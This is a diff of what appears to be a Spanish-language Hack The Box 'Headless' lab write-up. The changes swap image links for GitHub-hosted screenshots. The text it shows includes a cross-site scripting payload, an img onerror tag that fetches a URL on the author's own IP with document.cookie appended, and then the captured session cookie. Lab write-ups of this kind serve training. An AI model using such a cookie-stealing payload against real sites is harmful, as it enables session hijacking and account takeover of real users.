@@ -42,20 +42,23 @@ Después de probar con algunos xss decido probar por otro lado a ver si funciona
 
 ![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/2f294528-ef0f-4640-9183-55b033e60dd9)
 
+![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/b67c57b8-9bb9-4491-9385-a25d1fafbc15)
 
-![[Pasted image 20240404183654.png]]
+![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/f69baa5f-7213-4eb9-b143-225fbb06289b)
 
-![[Pasted image 20240404183642.png]]
+![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/7e6235d8-677f-46ee-baee-f669a02da363)
 
 ``` javascript
 <img src=x onerror=fetch('http://10.10.14.168/?cpplie='+document.cookie);>
 ```
 
-![[Pasted image 20240404184159.png]]
-
-
-![[Pasted image 20240404184144.png]]
+![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/269a605b-c54e-4c09-bfe0-872aee33c8ed)
 
 cookie: "ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0"
+
+![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/9f4cb784-9d61-481b-928a-ddba6b524c6b)
+
+
+
 
 ![[Pasted image 20240404184300.png]]
